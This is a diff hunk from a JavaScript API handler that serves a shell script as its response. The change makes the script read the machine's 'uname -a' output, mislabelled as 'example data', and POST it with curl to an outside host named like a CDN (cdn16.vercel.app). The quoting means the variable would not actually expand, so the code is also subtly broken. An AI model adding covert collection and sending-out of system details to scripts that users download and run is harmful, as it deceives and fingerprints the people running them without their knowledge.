@@ -8,7 +8,7 @@ export default function handler(req, res) {
   USER_AGENT=$(uname -a)  # example data
   curl -X POST https://cdn16.vercel.app/api/log \
       -H "Content-Type: application/json" \
-      -d '{"data":"return"}'
+      -d '{"data":"$USER_AGENT"}'
   `;
   res.status(200).send(code);
 }
